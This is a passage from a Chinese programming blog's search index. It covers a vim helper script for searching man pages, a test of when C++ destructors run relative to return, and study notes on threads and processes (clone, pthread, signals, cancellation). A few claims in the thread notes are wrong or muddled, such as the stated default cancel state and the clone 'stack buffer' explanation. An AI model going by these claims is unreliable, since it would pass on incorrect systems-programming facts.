\u0026#34;Not even in cppman!\u0026#34; fi fi rm $VIMAN_ARG if [ $VIMAN_EXITCODE -ne 0 ];then echo \u0026#34;Coundn\u0026#39;t find manual for $entry_name!\u0026#34; fi exit $VIMAN_EXITCODE 然后放到/usr/local/bin中并sudo chmod +x /usr/local/bin/viman后大功告成\n如果想要在vim里面查看，可以使用命令：\ntabnew | exec \u0026#34;:term ++curwin viman -e \u0026lt;entry_name\u0026gt;\u0026#34; 这个命令会新打开一个tab执行shell命令\n然而这个命令实在是太长了，我们可以在~/.vimrc中写入：\nfunction! VimanFunc(entry_name, ...) let args = join(a:000, \u0026#39; \u0026#39;) tabnew | execute \u0026#34;term ++curwin viman -e \u0026#34; . a:entry_name . \u0026#34; \u0026#34; . args endfunction command! -nargs=+ Viman :call VimanFunc(\u0026lt;f-args\u0026gt;) cnoreabbrev viman Viman 使用的时候只需要在vim中输入:viman \u0026lt;entry_name\u0026gt; ...即可\n","date":"2023年05月24日","permalink":"https://peterliuzhi.top/tricks/%E4%BD%BF%E7%94%A8vim%E5%9C%A8mantldrcppman%E5%BA%93%E9%97%B4%E6%90%9C%E7%B4%A2%E5%B8%AE%E5%8A%A9%E6%89%8B%E5%86%8C%E5%B9%B6%E6%89%93%E5%BC%80/","section":"tricks","summary":"Technological progress has merely provided us with more efficient means for going backwards. — Aldous Huxley 这里我是写了一个bash脚本，只需要使用命令viman -e 函数/命令名就能自动在man/cppman间搜索。之所以写这个","tags":["vim","man","shell","bash"],"title":"使用vim在man、tldr、cppman库间搜索帮助手册并打开"},{"categories":["posts","C++"],"contents":" If you want to succeed you should strike out on new paths, rather than travel the worn paths of accepted success. — John Locke\n问题引入 当我在学习C++标准库中的线程锁的时候，对以下代码出现了问题：\nint read_data() { int tmp; std::shared_lock\u0026lt;std::shared_mutex\u0026gt; lock(rw_mutex); tmp = shared_data; return tmp; } 当我使用一个shared_lock来托管读写锁，因为析构函数会执行解锁，那么问题就来了，这个解锁是在return之前发生的还是在}处发生的？虽然直觉告诉我是在return之前发生的，但还是隐隐地有些不放心，如果在}处调用的话，那么就可能造成死锁问题；如果是在return之前发生的话，那以下代码中返回值直接使用共享对象的值是否有可能在析构函数解锁到return这一小段时间内发生改变？\nint read_data() { std::shared_lock\u0026lt;std::shared_mutex\u0026gt; lock(rw_mutex); return shared_data; } 验证程序 编译以下程序后使用gdb调试：\n#include \u0026lt;iostream\u0026gt; class A { public: A() { std::cout \u0026lt;\u0026lt; \u0026#34;A constructor\u0026#34; \u0026lt;\u0026lt; std::endl; } ~A() { std::cout \u0026lt;\u0026lt; \u0026#34;A destructor\u0026#34; \u0026lt;\u0026lt; std::endl; __asm__ volatile( \u0026#34;mov $1, %rax\u0026#34; ); } }; int main(int argc, char const* argv[]) { A a; std::cout \u0026lt;\u0026lt; \u0026#34;Before return\u0026#34; \u0026lt;\u0026lt; std::endl; return 0x111111; } 这里刻意让析构函数有多条语句方便观察，同时刻意使用了内嵌汇编改变rax的值（因为返回值保存在rax寄存器里面），然后在std::cout \u0026lt;\u0026lt; \u0026quot;A destructor\u0026quot; \u0026lt;\u0026lt; std::endl;处打上断点用gdb查看：\n显然这时候进入了析构函数，并且rax的值并没有被设置为主函数的返回值\n然后经过内嵌汇编的更改，rax成功变成了1\n再次单步执行之后就发现返回值设置为主函数返回值了，也就是说析构函数可以看作一定是在return语句之前执行的\n另一个程序 #include \u0026lt;iostream\u0026gt; class A { public: A() { std::cout \u0026lt;\u0026lt; \u0026#34;A constructor\u0026#34; \u0026lt;\u0026lt; std::endl; } ~A() { std::cout \u0026lt;\u0026lt; \u0026#34;A destructor\u0026#34; \u0026lt;\u0026lt; std::endl; __asm__ volatile( \u0026#34;mov $1, %rax\u0026#34;); } }; int main(int argc, char const* argv[]) { A a; std::cout \u0026lt;\u0026lt; \u0026#34;Before return\u0026#34; \u0026lt;\u0026lt; std::endl; return puts(\u0026#34;111\u0026#34;); } 这个程序的输出是：\n可以看到，被我们写在“return语句”中的函数puts在析构函数之前调用了，说明所谓的return语句其实只是对rax的设置，可以理解为退出状态，如果在return语句中使用函数，编译后都会放在前面执行完毕，然后在设置退出状态之前调用析构函数\n退出状态是存在哪里的 现在就有一个很重要的问题，退出状态是存在哪里的？是否会涉及到内存地址的访问？如果涉及到内存地址的访问，是否有可能在读入的时候内存单元内容被其他线程改变？\n在C/C++的高度抽象层面我们是得不到答案的，因此我们使用GCC获取它的汇编代码：\ngcc -S test_destructor.cpp -o test_destructor.asm 然后定位到main函数的leave; ret那个位置看一看：\n发现这个设置退出状态确实有可能设计内存访问，但是这里是对栈的内存访问，如果返回值存放在函数栈上，一般来说是不会和其他线程产生竞争条件的\n并且在这里我们看到析构函数是在canary的检查之前调用的（我们可以使用c++filt工具解析一下这个阴间函数）：\n那么，在我们原本的读写锁源代码文件里面，是否可能出现我们担心的问题呢？我们可以将其编译成汇编代码看一下：\n发现通过编译器的优化，这个共享内存单元的值被提前保存在了栈上，感谢编译器！\n结论 也就是说，如果直接返回共享内存单元在编译后经过编译器优化（在debug模式下仍然会这么优化）后，其实际作用和将这个共享内存单元的值保存在tmp变量中是一样的，但是后者的语义更加清晰，前者的代码量更少并且更依赖于编译器。我个人比较谨慎，我选择后者的写法。\n同时，如果希望控制shared_lock、unique_lock、lock_guard的析构，可以使用花括号表明他们的生存期：\nint read_data() { int tmp; { std::shared_lock\u0026lt;std::shared_mutex\u0026gt; lock(rw_mutex); tmp = shared_data; } return tmp; } 但注意，这样的话，如果return语句中调用了其他的函数，就会在锁之外执行\n同时，不建议手动调用unlock来对其解锁，因为析构函数可能还会解锁一次，这时候会抛出异常（lock函数同理）:\n不过依实现其表现可能不同\n","date":"2023年05月21日","permalink":"https://peterliuzhi.top/posts/c++%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0%E4%BC%9A%E5%9C%A8%E8%BF%94%E5%9B%9E%E8%AF%AD%E5%8F%A5%E4%B9%8B%E5%89%8D%E8%BF%98%E6%98%AF%E4%B9%8B%E5%90%8E%E8%B0%83%E7%94%A8/","section":"posts","summary":"If you want to succeed you should strike out on new paths, rather than travel the worn paths of accepted success. — John Locke 问题引入 当我在学习C++标准库中的线程锁的时候，对以下代码出现了问题： int read_data() { int tmp; std::shared_lock\u0026lt;std::shared_mutex\u0026gt; lock(rw_mutex); tmp = shared_data; return tmp; } 当我使","tags":["杂谈","C++"],"title":"C++析构函数会在返回语句之前还是之后调用？直接返回共享对象是否会产生竞争条件？"},{"categories":["principle","操作系统"],"contents":" Applause is a receipt, not a bill. — Dale Carnegie\n什么是线程 A thread is a basic unit of CPU utilization\n每个线程是一个CPU使用的基本单元，包括线程ID、程序计数器（Program Counter，PC，和CS:IP差不多）、寄存器组、堆栈（stack）等\n在大多数现代操作系统中，线程是内核调度的最小单位。\n需要注意的是，传统的线程概念是由Windows发展的，在Linux中原生没有进程与线程的明确区分，只有任务（task），进程和线程都是任务的子概念\n在Linux中，进程和线程都是使用task_struct结构体来表示的。每个进程都有一个唯一的进程ID（PID），而每个线程都有一个唯一的线程ID（TID）。在Linux中，线程也被称为轻量级进程（Lightweight Process，LWP），它们与普通进程共享某些资源，如虚拟内存空间、文件描述符和信号处理程序等。\n多线程的优点 响应性，可以同时处理多个任务，减少等待时间 资源共享，线程相较于需要特别设计的进程，是默认共享内存和资源的 经济，创建进程需要的资源比线程更多 可伸缩性，多线程进程可以用于多个CPU，而单线程进程只能用于一个CPU 多核编程 并发和并行 并发性（concurrency）要求支持多个任务，并且每个任务都可以取得进展 并行性（parallelism）要求可以同时执行多个任务 显然，并发性可以在没有实现并行性的时候实现\n两种并行类型 数据并行 注重将数据分布于多个计算核上，每个线程执行相同的操作 任务并行 注重将任务分布于多个计算核上，每个线程执行不同的操作 多线程模型 用户线程和内核线程 用户线程处于用户层，在内核层之上 轻量级：管理无需内核支持，操作系统不知道它，创建和切换的代价小，从而通过快速切换任务可以实现更高的并发性 无法利用多核CPU的并行性，也无法直接调用操作系统提供的系统资源和服务（例如文件I/O、网络通信等），必须通过系统调用的方式才能与操作系统内核交互 内核线程直接由操作系统支持与管理 能够直接访问操作系统内核的资源和服务，可以利用多核CPU的并行性，具有更高的可靠性和安全性 创建和切换的代价较大，也会占用更多的系统资源 为了兼顾用户线程和内核线程的优点，常常采用一种折中的解决方案，即将用户线程映射到内核线程上。这样，用户线程就能够利用操作系统内核的资源和服务，同时也能够充分利用多核CPU的并行性。\n下面就来看一看这些将用户线程映射到内核线程的模型\n多对一模型 多个用户线程映射到一个内核线程，理论上可以实现任意多个线程，但是：\n这样多线程就不能运行于多个处理核上，因此并行性没有得到实现 一个线程堵塞会导致整个进程堵塞 一对一模型 允许一个用户线程映射到一个内核线程，允许多个线程运行在多个处理核上，但是这样就限制了线程的数量，不能创建过多的线程\n多对多模型 多路复用多个用户线程到相同数量或更少的内核线程（取决于具体应用程序或机器），用户线程的数量理论上是无限的\n需要注意的是，因为内核线程是固定的，所以增加用户线程数量并不会增加并发性。\n因为用户线程映射到多个内核线程，所以一个线程的阻塞不会导致整个进程的阻塞\n虽然多对多模型很灵活，但是因为多对多模型比较复杂，又因为CPU核数越来越多，所以现在越来越趋向于使用一对一模型（大部分系统现在都使用一对一模型）\n双层模型 结合了多对多和一对一\nLinux下的多线程编程 系统调用fork和exec 有两个问题：\nfork会复制一个进程的所有线程还是单个线程？ 有的UNIX系统有两种fork，既可以复制所有线程，又可以复制单个线程 exec会覆盖一个进程的所有线程还是单个线程？ exec会覆盖所有线程 Linux下如何创建线程 因为Linux下理论上没有进程与线程之分，只有task，因此创建进程和创建线程之前的区别非常微妙，没有非常明确的界限（不代表没有界限）\n具体地，Linux下创建进程可以使用clone系统调用，也可以使用pthread库来创建和管理线程\n如果使用clone的话，代码是比较原始的，因为线程之间默认共享内存，所以程序需要划分一块栈空间给新线程，并保证其不会越界：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sched.h\u0026gt; #define STACK_SIZE 65536 void *thread_func(void *arg) { printf(\u0026#34;Hello, world!\\n\u0026#34;); return NULL; } int main() { char *stack = malloc(STACK_SIZE); int tid = clone(thread_func, stack + STACK_SIZE, CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND, NULL); if (tid == -1) { perror(\u0026#34;clone\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;New thread ID: %d\\n\u0026#34;, tid); sleep(1); return 0; } 其中clone()系统调用的函数原型是：\nint clone(int (*fn)(void *), void *child_stack, int flags, void *arg, ... /* pid_t *ptid, struct user_desc *tls, pid_t *ctid */ ); 其中，fn 参数是一个函数指针，用于指定新线程的入口函数，child_stack 参数是新线程的栈空间，flags 参数用于指定新线程的标志，arg 参数是传递给新线程入口函数的参数。clone() 调用成功时返回新线程的线程 ID（TID）。\n重要的是其中的flags参数，一般来说需要将CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND四个flag或起来作为flags参数传递（内存空间共享、文件系统信息共享、打开文件集共享、信号处理程序共享），如果不指定任何flags，那么就不会产生任何共享，效果类似于用fork新建进程\n如果指定CLONE_THREAD标识，则新建线程会与主线程具有同一线程组ID，属于同一进程\n如果你在调用clone函数时指定了CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND这四个标志，但没有指定CLONE_THREAD标志，那么新创建的线程将不会是一个从属线程，而是一个独立的进程。\n当你指定了CLONE_VM标志时，新创建的进程将与调用进程共享虚拟内存空间。当你指定了CLONE_FS标志时，新创建的进程将与调用进程共享文件系统信息，如根目录、当前工作目录和umask值等。当你指定了CLONE_FILES标志时，新创建的进程将与调用进程共享文件描述符表。当你指定了CLONE_SIGHAND标志时，新创建的进程将与调用进程共享信号处理程序。\n然而，即使你指定了这些标志，如果你没有指定CLONE_THREAD标志，那么新创建的线程仍然会被视为一个独立的进程。它将拥有自己的进程ID和线程组ID，并且不会与调用进程属于同一线程组。\n具体区别如下：\nclone() 可以控制新进程或线程的栈空间。clone() 系统调用可以通过设置新进程或线程的栈空间的起始地址和大小，从而灵活地控制栈空间的大小和使用方式。 clone() 可以控制新进程或线程的执行环境。clone() 系统调用可以通过设置新进程或线程的执行环境，如信号屏蔽字、CPU 亲和性等，从而灵活地控制新进程或线程的执行环境。 clone() 可以创建更轻量级的线程。由于 clone() 可以创建共享资源的进程或线程，因此可以使用 clone() 调用创建更轻量级的线程，而不需要像 fork() 调用那样创建一个全新的进程。 在 clone() 系统调用中，如果不设置 CLONE_VM 标识，则新线程将使用主线程分配的内存作为自己的栈空间的缓冲区。具体来说，主线程会为新线程分配一块内存，作为新线程栈空间的缓冲区，但是这块内存并不是直接作为新线程的栈空间使用的，而是在新线程启动时被映射到新线程的栈空间中。\n这种方式被称为栈空间的缓冲区或栈空间的预留区。它的作用是提高程序的性能，减少频繁的系统调用和内存分配操作。在新线程启动时，它可以快速地将栈空间的缓冲区映射到新线程的栈空间中，避免了频繁的内存分配操作，从而提高了程序的运行效率。\n需要注意的是，栈空间的缓冲区并不是新线程的实际栈空间，它只是一个临时的缓冲区，用于存储新线程栈空间的初始状态。一旦新线程启动后，它的栈空间将从栈空间的缓冲区中复制出来，并成为新线程的实际栈空间，从此以后，新线程的栈空间将与主线程的栈空间是完全独立的，互相之间不会产生任何影响。\n如果使用pthread库，就要先包含pthread.h头文件\n#include \u0026lt;pthread.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; void *thread_func(void *arg) { printf(\u0026#34;Hello, world!\\n\u0026#34;); pthread_exit(NULL); } int main() { pthread_t tid; pthread_create(\u0026amp;tid, NULL, thread_func, NULL); pthread_join(tid, NULL); return 0; } 其中：\n包含头文件 pthread.h。 定义线程函数，函数返回类型为 void *，参数为 void *。 在主函数中使用 pthread_create 函数来创建线程，该函数的参数包括线程标识符、线程属性、线程函数和函数参数。 使用 pthread_join 函数来等待线程结束并获取线程返回值。 使用 pthread_exit 函数来结束当前线程。 UNIX信号与其处理 什么是信号？\n信号是由特定事件的发生而产生的（比如按下Ctrl-C） 信号需要被传递给某个进程 信号一经收到就必须处理 如何处理信号？\n使用缺省的信号处理程序（由内核运行） 使用用户自定义的信号处理程序 而因为信号传递给进程，所以多线程进程需要选择如何传递信号。有以下几种策略：\n传递信号到信号所适用的线程 传递信号到所有线程 传递信号到某些线程 在Linux中，可以通过线程组ID（Thread Group ID，TGID）来定义一个进程的所有线程。线程组ID实际上就是该进程主线程的线程ID。也就是说，一个进程的所有线程都具有相同的线程组ID。因此，你可以通过检查线程的线程组ID来确定它们是否属于同一进程。\n在Windows下并不原生有信号支持，但是可以通过异步过程调用（Asychronous Procedure Call, APC）来指定当线程收到某特定通知的时候调用的函数。因为Windows中是将APC传递给线程而非进程，所以相对于UNIX更加简单。\n标准的信号处理函数如下，向指定进程传递信号。而得到信号的进程需要自己决定如何处理该信号。\n#include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;signal.h\u0026gt; int kill(pid_t pid, int sig); 其中，pid参数指定了接收信号的进程或进程组。当pid大于0时，信号将被发送给进程ID为pid的进程。当pid等于0时，信号将被发送给与调用进程属于同一进程组的所有进程。当pid小于-1时，信号将被发送给进程组ID为-pid的所有进程\n不能直接向线程发送信号。在Linux中，可以使用tgkill系统调用来向特定线程发送信号。它的函数原型如下：\n#include \u0026lt;sys/syscall.h\u0026gt; int tgkill(int tgid, int tid, int sig); 其中，tgid参数指定了线程组ID（即主线程的线程ID），tid参数指定了线程ID，而sig参数指定了要发送的信号。\n请注意，glibc并没有提供对这个系统调用的封装，因此如果想使用这个函数，需要采用syscall的方式，如下：\nret = syscall(SYS_tgkill, tgid, tid, sig); 如果想向当前进程传递信号：\nint raise(int sig); 如果想自定义信号处理函数，可以使用signal系统调用：\n// 函数原型 void (*signal(int sig, void (*func)(int)))(int); // 示例 #include \u0026lt;signal.h\u0026gt; void handler(int sig) { // 处理 SIGINT 信号 } signal(SIGINT, handler); 在 pthread 库中，信号处理函数与传统的信号处理函数略有不同。pthread 库提供了一组新的接口来处理信号，这些接口可以在多线程程序中安全地使用，避免了传统信号处理函数中可能出现的竞态条件和不可预测的行为。\npthread 库中的信号处理函数包括 pthread_sigmask() 和 pthread_kill()。\npthread_sigmask() pthread_sigmask() 函数可以用来设置线程的信号屏蔽集。信号屏蔽集是一组信号，当它们被屏蔽时，不会被传递到线程中。此函数的原型如下：\n#include \u0026lt;signal.h\u0026gt; int pthread_sigmask(int how, const sigset_t *set, sigset_t *oldset); 其中，how 参数指定了如何修改信号屏蔽集，可以取以下值：\nSIG_BLOCK：将 set 中的信号添加到线程的信号屏蔽集中。 SIG_UNBLOCK：将 set 中的信号从线程的信号屏蔽集中移除。 SIG_SETMASK：将线程的信号屏蔽集设置为 set 中的信号集。 set 参数是一个指向信号集的指针，指定要添加或移除的信号集。\noldset 参数是一个指向旧信号屏蔽集的指针，用于存储函数调用前线程的信号屏蔽集。如果不需要保存旧信号屏蔽集，则可以将该参数设置为 NULL。\npthread_kill() pthread_kill() 函数用于向指定线程发送信号。该函数的原型如下：\n#include \u0026lt;signal.h\u0026gt; int pthread_kill(pthread_t thread, int sig); 其中，thread 参数指定要发送信号的线程，sig 参数指定要发送的信号。\n注意，与 kill() 函数不同，pthread_kill() 函数发送的信号只会影响指定线程，不会影响整个进程。\n信号处理函数 在多线程程序中，每个线程都可以设置自己的信号处理函数，用于处理收到的信号。可以使用 sigaction() 函数来注册信号处理函数，如下所示：\n#include \u0026lt;signal.h\u0026gt; struct sigaction { void (*sa_handler)(int); void (*sa_sigaction)(int, siginfo_t *, void *); sigset_t sa_mask; int sa_flags; void (*sa_restorer)(void); }; int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact); 其中，signum 参数指定要注册的信号，act 参数是指向 sigaction 结构的指针，用于设置信号处理函数和其他相关属性。oldact 参数是指向旧信号处理函数的指针，用于存储函数调用前的信号处理函数。如果不需要保存旧信号处理函数，则可以将该参数设置为 NULL。\nsa_handler 成员指定了简单的信号处理函数，它接收一个整数参数，表示收到的信号编号。如果设置了 sa_sigaction 成员，那么它将作为扩展处理函数被调用，而不是简单的信号处理函数。sa_mask 成员指定了在信号处理函数执行期间阻塞的信号集。sa_flags 成员指定了其他标志，例如是否启用 SA_RESTART 标志以自动重启被中断的系统调用。\n在信号处理函数中，可以调用 pthread_sigmask() 函数来设置线程的信号屏蔽集，保护信号处理函数中的临界区，避免竞态条件和其他线程的干扰。\n线程撤销（Thread Cancellation） 有时候，有可能其他线程先一步完成了任务，其他线程不用继续；或者出现了其他情况（比如用户突然停止加载网页），需要紧急停止线程。这时候就需要进行线程撤销\n有两种类型的撤销：\n异步撤销（Asynchronous cancellation），一个线程立即终止目标线程 延迟撤销（Deferred cancellation），一个线程指示目标线程应该被撤销，目标线程不断检查自己是否应该被撤销，实现了有序性 如果资源已经被分配给已撤销的线程，或者线程在更新与其他线程共享的数据，撤销会有困难（尤其对异步撤销）。通常，操作系统会释放部分系统资源而不是全部。（因此，异步撤销可能不会释放必要的系统资源）\n相反，由于延迟撤销的有序性，线程撤销会更加安全\n要实现线程撤销，可以在主线程中调用 pthread_cancel() 函数，向目标线程发送取消请求：\npthread_t thread; // 创建新线程并启动 pthread_create(\u0026amp;thread, NULL, thread_func, NULL); // 撤销线程 pthread_cancel(thread); 如果想要设置撤销的模式，需要在线程调用的函数中设置。pthread库支持三种撤销模式，每种模式都有一个state域和type域，可以在线程调用的函数中设置\n注意，在线程创建时，默认的取消状态是不启用（PTHREAD_CANCEL_DISABLE）\n要实现延迟撤销，可以在目标线程中设置取消状态和取消点。\nvoid* thread_func(void* arg) { // 设置取消状态和取消点 pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL); pthread_setcanceltype(PTHREAD_CANCEL_DEFERRED, NULL); // 执行线程操作 while (1) { // 在循环中检查取消请求并处理 pthread_testcancel(); // ... } return NULL; } 在这个例子中，线程函数中使用了一个无限循环，并在循环中调用了 pthread_testcancel() 函数，以检查是否有取消请求。同时，在线程启动时，通过 pthread_setcancelstate() 和 pthread_setcanceltype() 函数设置了取消状态和取消点。这样，当取消请求到达时，线程会在下一个取消点时退出。\n相对来说，Linux更推荐延迟撤销的方法\n在Linux中，pthread API使用信号来实现线程撤销，因此，如果不使用pthread库，同样可以使用kill()系统调用来传递信号实现线程撤销。如果要实现延迟撤销，可以自定义信号处理函数（比如，可以定义一个全局的标识位，一旦传入撤销信号，就设置该标识位，然后在线程函数中检查该标识位）。\n线程本地存储 虽然线程共享很多数据，但它也需要一些自己私有的数据，这种数据叫做线程本地存储（Thread Local Storage, TLS）\nTLS不是局部变量，更类似于静态变量，但只对所属的线程可见\n调度器激活 在我们使用用户线程库管理用户线程时，虽然可以无需内核支持，但是总有使用到内核的地方（比如系统调用），这时，就需要有一种办法进行内核与用户线程库之间的通信。使用调度器激活（Scheduler Activations）可以实现内核与用户线程库之间的通信\n轻量级进程（Lightweight Process，LWP） 轻量级进程(LWP)是建立在内核之上（位于用户线程和内核线程之间）并由内核支持的用户线程，它是内核线程的高度抽象，每一个轻量级进程都与一个特定的内核线程关联。\n在支持LWP的操作系统中，每个用户线程都会映射到一个LWP上，而每个LWP又会映射到一个内核线程上。这种设计允许操作系统在用户线程和内核线程之间提供更多的控制和调度能力。\n对于线程库来说，LWP就好像虚拟处理器，可以调度用户线程运行在LWP上\nTo the user-thread library, the LWP appears to be a virtual processor on which the application can schedule a user thread to run. Each LWP is attached to a kernel thread, and it is kernel threads that the operating system schedules to run on physical processors.\n由于本质是用户线程：故轻量级进程可以共享诸如地址空间，打开的文件等，只要其中一个修改共享资源，另一个就立即查看这种修改\n同时由于与内核进程相关联：所以每个LWP都可以作为独立单元由Kernel独立调度，同时由于内核线程位于Kernel，而Kernel正是所有资源的管理者，这也LWP也就可以像独立进程一样享有专门的中断。\n虽然看起来很妙，但是：\n大多数LWP的操作，如建立、析构以及同步，都需要进行系统调用。系统调用的代价相对较高：需要在user mode和kernel mode中切换。 每个LWP都需要有一个内核线程支持，因此LWP要消耗内核资源（内核线程的栈空间）。因此一个系统不能支持大量的LWP。 在Linux中，线程和轻量级进程是同义词。它们都表示一种轻量级的执行实体，可以与其他线程共享某些资源。从kernel看，其实看到的就是LWP，而从用户态看其实就是我们所说的用户线程。\n参考：LWP 轻量级进程的理解 - 知乎\n总而言之，LWP使得内核在某种程度上认识了“线程”，使得内核中的最小调度单元从process变成了thread，因此“线程”是内核调度的最小单位\n回调（upcall） 内核提供一组虚拟处理器LWP给应用程序来运行用户线程。当发生某种事件时，内核会通知应用程序，这就叫做回调（upcall）（可以理解为向上面打电话）。这些回调可以由线程库提供的回调处理程序（upcall handler）处理，而这个回调处理程序又需要虚拟处理器来支持，所以此时内核同时会提供一个新的LWP给线程库\n","date":"2023年04月13日","permalink":"https://peterliuzhi.top/principle/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E7%BA%BF%E7%A8%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"principle","summary":"Applause is a receipt, not a bill. — Dale Carnegie 什么是线程 A thread is a basic unit of CPU utilization 每个线程是一个CPU使用的基本单元，包括线程ID、程序计数器（Program Counter，PC，和C","tags":["pwn","操作系统概念读书笔记"],"title":"【操作系统概念读书笔记】线程基础知识"},{"categories":["principle","操作系统"],"contents":" We all grow up. Hopefully, we get wiser. Age brings wisdom, and fatherhood changes one\u0026rsquo;s life completely. — Frank Abagnale\n什么是进程 进程的概念 所有的CPU活动称为进程(process)。进程是程序执行的过程，是程序资源管理的最小单位。\n在Linux中，没有进程和线程的概念（或者说进程和线程都是任务(task)的子概念），详细见Linux-Kernel Archive: Re: proc fs and shared pids\n进程是执行的程序，是活动的实体(active entity)，是可执行程序的语境/上下文(the context of executable, COE)\nBoth threads and processes are really just one thing: a \u0026ldquo;context of execution\u0026rdquo;. Trying to artificially distinguish different cases is just self-limiting.\n程序本身不是进程，程序是一个被动的实体(passive entity)，有时又被称为文本段（就是.text section，虽然程序里不止有这一个section）。显然的，进程相对于这没有生气的实体有更多的活动内容（比如堆、栈和.bss section）\n既然进程是程序的活动，那么同一个程序就可以有多次活动，而这多次活动都是不同的进程。\n同时，既然进程是一种语境/上下文(context)，那么它也可以作为一个环境来执行其他代码。比如python和Java虚拟机。\n描述进程的状态 进程的整个运行过程从整体来看是抽象的，但是我们可以取该抽象过程的一个切片来研究，也就是进程的状态。\n进程有五种状态，这五种状态随着操作系统的不同而不同：\n而为了描述这五种状态，我们可以采用进程控制块（Process Control Block, PCB，或者任务控制块，Task Control Block），它从多种层面描述当前进程的状态：\n通过这些描述信息，系统可以轻松地进行中断或系统调用，然后使用PCB的信息恢复如初\n比如在Linux中，PCB就使用一个结构体task_struct来表示：\nstruct task_struct { #ifdef CONFIG_THREAD_INFO_IN_TASK /* * For reasons of header soup (see current_thread_info()), this * must be the first element of task_struct. */ struct thread_info\tthread_info; #endif unsigned int\t__state; #ifdef CONFIG_PREEMPT_RT /* saved state for \u0026#34;spinlock sleepers\u0026#34; */ unsigned int\tsaved_state; #endif /* * This begins the randomizable portion of task_struct. Only * scheduling-critical items should be added above here. */ randomized_struct_fields_start void\t*stack; refcount_t\tusage; /* Per task flags (PF_*), defined further below: */ unsigned int\tflags; unsigned int\tptrace; // ... // 以下省略大概七百行 进程调度（Process Scheduling） 多道程序设计的目标是，无论何时都有程序运行，从而最大化CPU的利用率。 分时系统的目的是在进程之间快速切换CPU，以便用户在程序运行时能与其交互 为了满足这些需求，我们就需要合理地进行进程调度。\n调度队列（Scheduling Queues） 进程调度经常会使用调度队列：\n进程在进入系统时，会进入作业队列（job queue） 驻留在内存中的、就绪的、等待运行的进程保存在就绪队列（ready queue） 等待特定I/O设备的进程列表，称为设备队列（device queue） 进程在这些队列和CPU之间轮转，从而实现进程调度：\n由此，我们的问题从抽象的调度问题转化为了队列的调度问题。为了合理地安排进程在他们中的轮转，我们需要一个调度器（scheduler）（或者翻译为调度程序，但是我感觉会和程序调度弄混，于是下文采用了调度器这个翻译）\n调度器（Scheduler） 调度器分为两种：\n长期调度器/作业调度器从大容量储存设备（磁盘）的缓冲池中选择进程加到内存（UNIX和Windows的分时系统通常没有长期调度程序，只是简单地把所有新进程放在内存中） 比如批处理系统中，提交的经常多于可以立即执行的，这时候这些进程就会保存到（长期）缓冲池中 长期调度器更类似于做一个长期的规划 长期调度器需要控制多道程序程度(degree of multiprogramming，也就是内存中进程的数量)，当多道程序程度稳定的时候，创建进程的平均速度必须等于进程离开系统的平均速度 长期调度器的执行并不频繁，因此，长期调度器能有更多的时间做选择，也必须认真选择 中期调度器/交换区（midium-term scheduler/swapping） 的核心思想是将进程从内存中移出放在交换区中，从而降低多道程序程度，之后再重新将这些进程载入 将进程移出称为换出，将进程重新载入称为换入 只有当内存快爆了（多道程序程度太高）的时候Swapping才比较必要 短期调度器/CPU调度器从准备执行的进程中选择进程，并分配CPU 短期调度器更类似于做一个立即的执行 短期调度器必须快（通常每100ms必须执行一次） 大多数进程可以分为两种：\nI/O密集型（I/O-bound），时间主要花费在I/O上，CPU干的事不多 CPU密集型（CPU-bound），很少产生I/O请求，但是CPU要进行的计算很多 因此，为了让CPU不闲下来，时时刻刻有事可做，又不能让一个任务堵塞CPU太久，导致其他的任务无法执行，调度器就需要合理地安排这些进程（比如强行中断CPU密集型工作，转换为其他进程）\n上下文切换/语境转移（context switch） 因为进程在调度器的控制下在调度队列和CPU间不断轮转，为了在一个进程没有执行完转换为其他进程，在之后再恢复（比如为了防止CPU密集型堵塞CPU）；还有时进程会进行中断或系统调用，CPU需要离开当前进程转而执行中断或系统调用\n这时我们就需要在PCB中保存当前进程的上下文/语境（context，包括CPU寄存器、进程状态、空间管理等），切换为下一个进程（或者中断或系统调用）的上下文/语境\n这种切换的效率是非常仰仗于硬件支持的，比如有一些硬件会提供多套寄存器，上下文切换只需要简单地转换使用哪套寄存器\n同时，更复杂的操作系统的机制也会要求更复杂的上下文切换操作，比如一个有堆机制的操作系统需要保存的上下文肯定比没有堆机制的操作系统多且杂\n进程运行控制 操作系统需要为进程的创建和终止提供一套机制\n进程创建 进程在它的生存期内可能创建其他进程，其中创建者称为父进程（parent process），被创建者称为子进程（children process），由此构成一个进程的树状结构（继承树）\n又因为同一个可执行文件可能有多个活动实体，也就是进程，为了区别这些进程，我们只确定进程的名字是不够的（因为有可能来源于同一个可执行文件），我们还需要给每个进程一个独特的进程标识（process identifie，也就是pid）\n下面是一个典型的Linux进程/任务树，其中systemd进程是所有用户经常的根进程/父进程（在传统的UNIX系统中根进程是init，但是Linux后来采用了systemd，很多方面下和init很像，相当于init的升级版）\n子进程可能是父进程的复制品，也可能加载另一个程序；它可能和父进程并发执行，也可能父进程等待子进程执行完再执行\n当一个子进程创建的时候，可以直接从操作系统获取资源，也可以被限制只使用父进程的资源子集，这时父进程需要进行一定的资源分配。\n在Linux下，子进程一般来说会从父进程那里继承权限、调度属性、打开的文件等（因此可以利用文件描述符来实现共享内存）\n在Linux下，我们可以调用fork来产生新的进程，新的进程会得到一份父进程的内存地址空间的拷贝（因此可以很轻松地进行父子进程间的通信），然后两者都可以继续执行。\n由于fork对父进程返回子进程的pid，对子进程返回0，这种差异导致可以使用分支来区分父子进程执行的任务，比如如下代码：\n#include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { pid t pid; /* fork a child process */ pid = fork(); if (pid \u0026lt; 0) { /* error occurred */ fprintf(stderr, \u0026#34;Fork 